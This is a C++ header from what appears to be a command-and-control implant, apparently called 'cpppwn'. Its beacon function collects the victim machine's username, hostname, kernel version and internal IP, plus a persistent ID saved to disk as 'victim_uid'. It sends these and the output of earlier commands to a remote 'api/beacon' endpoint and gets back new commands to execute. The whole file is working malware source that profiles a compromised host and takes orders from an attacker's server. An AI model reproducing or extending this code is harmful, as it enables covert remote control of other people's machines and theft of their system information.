#pragma once

#include "Beacon.hpp"
#include "CommandDAO.hpp"
#include <RESTClient.hpp>
#include "ResultDAO.hpp"
#include "SecureStorage.hpp"
#include "Types.hpp"

#include <netdb.h>
#include <vector>
#include <unistd.h>
#include <limits.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

static std::vector<CommandResult> command_results = {};
static std::mutex results_mtx;

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard("Dumbo! You requested the IP, but didn't use it!")]]
static inline std::string get_internal_ip() {
    struct ifaddrs *ifaddr, *ifa;
    std::string ip = "127.0.0.1";

    if (getifaddrs(&ifaddr) == -1) return ip;

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr || ifa->ifa_addr->sa_family != AF_INET) continue;

        char host[NI_MAXHOST];
        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST) == 0) {
            std::string temp_ip = host;
            if (temp_ip != "127.0.0.1") {
                ip = temp_ip;
                break;
            }
        }
    }
    freeifaddrs(ifaddr);
    return ip;
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] static inline std::string get_or_create_id() noexcept {
    const fs::path storage_path = "identity.dat";
    const auto loaded = SecureStorage::load_uuid(storage_path);
    if (loaded) {
        return loaded.value();
    }

    std::string new_uuid = generate_uuid();
    SecureStorage::save_uuid(storage_path, new_uuid);

    return new_uuid;
}

//-------------------------------------------------
//
//-------------------------------------------------
[[nodiscard]] static inline std::vector<CommandDAO> sendBeacon(cpppwn::RESTClient& rest_client) noexcept {
    static const std::string client_uuid = get_or_create_id();

    try {
        BeaconRequest beacon;

        // 1. Get Username from Environment
        const char* user_env = std::getenv("USER");
        beacon.username = user_env ? user_env : "unknown";

        // 2. Get Hostname
        char host_buffer[HOST_NAME_MAX];
        gethostname(host_buffer, HOST_NAME_MAX);
        beacon.hostname = host_buffer;

        // 3. Get OS Info (Kernel version)
        struct utsname buffer;
        if (uname(&buffer) == 0) {
            beacon.operating_system = std::string(buffer.sysname) + " " + buffer.release;
        } else {
            beacon.operating_system = "Linux";
        }

        // 4. Network Info
        beacon.internal_ip = get_internal_ip();
        beacon.external_ip = "auto"; // let server fill this from socket info

        beacon.victim_uid = client_uuid;

        // 5. Include all command results since the previous beacon
        beacon.command_results = command_results;
        command_results.clear();

        // Assuming your post method returns the command list
        return rest_client.post<BeaconRequest, std::vector<CommandDAO>>("api/beacon", beacon);

    } catch(const std::exception& err) {
        return {};
    }
}